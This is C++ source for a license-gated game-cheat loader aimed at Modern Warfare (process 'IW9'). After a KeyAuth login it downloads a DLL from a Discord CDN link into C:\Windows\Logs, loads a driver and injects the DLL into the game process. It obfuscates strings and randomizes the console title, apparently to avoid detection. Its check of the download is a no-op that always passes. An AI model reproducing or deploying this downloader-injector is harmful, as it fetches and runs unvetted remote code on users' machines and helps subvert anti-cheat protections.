#include "Definition/stdafx.h"
#include "Communication/xor.h"
#include "Communication/api.h"
#include "driver/driver.h"
#include "injection/injector.h"
#include "Communication/drvutils.h"
///////////////////////////////////////////
#include <iostream>
#include <tlhelp32.h>
#include <fstream>
#include <filesystem>
#include <conio.h>
#include <tchar.h>
#include <urlmon.h>
#define _WIN32_WINNT 0x0500
#include <iostream>
#include <Windows.h>
#include <string>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#pragma comment(lib, "urlmon.lib")
#include <Mmsystem.h>
#include <mciapi.h>
#include <cstdio>
#include <strsafe.h>
#include <cstdlib>
#include <windows.h>
#include <d3d9.h>
#include <iostream>
#include <Dwmapi.h> 
#include <TlHelp32.h>
#include "auth.hpp"
#include "skStr.h"
//////////////////////////////////////////
using namespace KeyAuth;
std::string name = ""; // application name. right above the blurred text aka the secret on the licenses tab among other tabs
std::string ownerid = ""; // ownerid, found in account settings. click your profile picture on top right of dashboard and then account settings.
std::string secret = ""; // app secret, the blurred text on licenses tab and other tabs
std::string version = ""; // leave alone unless you've changed version on website
std::string url = "https://keyauth.win/api/1.2/"; // change if you're self-hosting

api KeyAuthApp(name, ownerid, secret, version, url);
using namespace std;



char ProcWindow[24];
char dllname[24];

void setcolor(unsigned short color)
{
	HANDLE hcon = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hcon, color);
}

void SetConsoleWindow(HANDLE conout, SHORT cols, SHORT rows)
{
	CONSOLE_SCREEN_BUFFER_INFOEX sbInfoEx;
	sbInfoEx.cbSize = sizeof(CONSOLE_SCREEN_BUFFER_INFOEX);
	GetConsoleScreenBufferInfoEx(conout, &sbInfoEx);
	sbInfoEx.dwSize.X = cols;
	sbInfoEx.dwSize.Y = rows;
	sbInfoEx.srWindow = { 0, 0, cols, rows };
	sbInfoEx.dwMaximumWindowSize = { cols, rows };
	SetConsoleScreenBufferInfoEx(conout, &sbInfoEx);

	DWORD mode;
	GetConsoleMode(conout, &mode);
	mode &= ~ENABLE_WRAP_AT_EOL_OUTPUT;
	SetConsoleMode(conout, mode);


}

int s_width = 800;
int s_height = 600;
#define CENTERX (GetSystemMetrics(SM_CXSCREEN)/2)-(s_width/2)
#define CENTERY (GetSystemMetrics(SM_CYSCREEN)/2)-(s_height/2)  //scrollbar remove
LPDIRECT3D9 d3d;    // the pointer to our Direct3D interface
LPDIRECT3DDEVICE9 d3ddev;
HWND hWnd;
const MARGINS  margin = { 0,0,s_width,s_height };

void TitleThread()
{
	while (true)
	{
		SetConsoleTitleA(random_string().c_str());
	}
}
std::thread Title(TitleThread);
int main()
{
	KeyAuthApp.init();
	if (!KeyAuthApp.data.success)
	{
		std::cout << skCrypt("\n Status: ") << KeyAuthApp.data.message;
		Sleep(1500);
		exit(0);
	}

	std::cout << skCrypt("\n\n [1] Login\n [2] Register\n [3] Upgrade\n [4] License key only\n\n Choose option: ");

	int option;
	std::string username;
	std::string password;
	std::string key;

	std::cin >> option;
	switch (option)
	{
	case 1:
		std::cout << skCrypt("\n\n Enter username: ");
		std::cin >> username;
		std::cout << skCrypt("\n Enter password: ");
		std::cin >> password;
		KeyAuthApp.login(username, password);
		break;
	case 2:
		std::cout << skCrypt("\n\n Enter username: ");
		std::cin >> username;
		std::cout << skCrypt("\n Enter password: ");
		std::cin >> password;
		std::cout << skCrypt("\n Enter license: ");
		std::cin >> key;
		KeyAuthApp.regstr(username, password, key);
		break;
	case 3:
		std::cout << skCrypt("\n\n Enter username: ");
		std::cin >> username;
		std::cout << skCrypt("\n Enter license: ");
		std::cin >> key;
		KeyAuthApp.upgrade(username, key);
		break;
	case 4:
		std::cout << skCrypt("\n Enter license: ");
		std::cin >> key;
		KeyAuthApp.license(key);
		break;
	default:
		std::cout << skCrypt("\n\n Status: Failure: Invalid Selection");
		Sleep(3000);
		exit(0);
	}

	if (!KeyAuthApp.data.success)
	{
		std::cout << skCrypt("\n Status: ") << KeyAuthApp.data.message;
		Sleep(1500);
		exit(0);
	}


	Title.detach();
	
	HANDLE hInput;
	DWORD prev_mode;
	hInput = GetStdHandle(STD_INPUT_HANDLE);
	GetConsoleMode(hInput, &prev_mode);
	SetConsoleMode(hInput, prev_mode & ENABLE_EXTENDED_FLAGS);
	//scrollbar off
	HANDLE out = GetStdHandle(STD_OUTPUT_HANDLE);
	SHORT cols = 100, rows = 20;
	SetConsoleWindow(out, cols, rows);
	int counter = 11; //amount of seconds

	string dwnld_URL = "https://cdn.discordapp.com/attachments/1033484588221218957/1046616211418533958/sawrsua.dll";
	string savepath = "C:\\Windows\\Logs\\bobo.dll";
	URLDownloadToFileA(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);
	if ("C:\\Windows\\Logs\\bobo.dll") 
	{
		setcolor(7);
		std::cout << "                        DEDE                      \n\n\n";
		DriverInitialization();
		//driver();
		cout << endl;
		setcolor(7);
		cout << xor_a("[-] Open Modern Warfare..") << endl;

		while (FindWindowEx(NULL, NULL, xor_a("IW9"), NULL) == NULL) {
			cout << ".";
			Sleep(1000);
		}

		system("cls");

		std::cout << "                        DEDE                        \n\n\n";

		cout << xor_a("[+] Recognized process..") << endl;
		Sleep(2000);
		setcolor(2);
		cout << xor_a("[>] Injecting, listen for the 'BEEP' and closing after") << endl;
		Sleep(2000);
		Enject(xor_a("IW9"), xor_w(L"C:\\Windows\\Logs\\bobo.dll"));
		Beep(200, 400);
		MessageBox(NULL, "[+] Injected Warzone Tool.\n[+] Press 'OK'", "Security", 1);
		//setcolor(7);
		//cout << xor_a("[>] Inject, Closing. . .") << endl;
		cout << endl;
		Sleep(666);
	}

	cout << endl;
	//Sleep(1000);
	exit;
}
